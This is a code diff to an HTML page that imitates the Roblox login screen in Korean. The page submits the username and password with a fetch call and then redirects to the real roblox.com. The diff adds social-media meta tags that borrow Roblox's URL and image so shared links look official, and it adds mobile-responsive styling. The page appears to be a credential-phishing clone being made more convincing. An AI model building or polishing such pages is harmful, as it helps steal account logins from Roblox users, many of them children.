@@ -3,7 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>로그인 페이지</title>
+    <title>로블록스 로그인 페이지</title>
+    
+    <!-- Meta Tags for SEO and Social Media -->
+    <meta property="og:title" content="로블록스 로그인 페이지">
+    <meta property="og:description" content="로블록스 로그인 페이지입니다. 사용자 이름과 비밀번호를 입력해 주세요.">
+    <meta property="og:image" content="https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196">
+    <meta property="og:url" content="https://www.roblox.com/ko/home">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="로블록스 로그인 페이지">
+    <meta name="twitter:description" content="로블록스 로그인 페이지입니다. 사용자 이름과 비밀번호를 입력해 주세요.">
+    <meta name="twitter:image" content="https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196">
+
     <style>
         *, *:before, *:after {
             box-sizing: border-box;
@@ -154,7 +165,8 @@
         }
 
         #react-login-container {
-            width: 400px;
+            width: 90%;
+            max-width: 400px;
             background-color: #393b3d;
             padding: 15px;
             border-radius: 8px;
@@ -253,6 +265,50 @@
         .signup-link:hover {
             text-decoration: underline;
         }
+
+        /* Media Queries for Responsive Design */
+        @media (max-width: 768px) {
+            .rbx-navbar-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .nav {
+                flex-direction: column;
+                margin-top: 10px;
+            }
+
+            .nav > li {
+                margin-bottom: 10px;
+            }
+
+            .content {
+                padding: 10px;
+            }
+
+            #react-login-container {
+                width: 100%;
+                padding: 10px;
+            }
+
+            .login-header {
+                font-size: 28px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-header {
+                font-size: 24px;
+            }
+
+            .btn-full-width {
+                padding: 8px;
+            }
+
+            .form-control {
+                padding: 8px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -341,7 +397,7 @@
                     })
                 }).then(response => {
                     if (response.ok) {
-                        //0.1초후에 리다이렉트
+                        // 0.1초 후에 리다이렉트
                         setTimeout(function() {
                             window.location.href = 'https://www.roblox.com/';
                         }, 100);
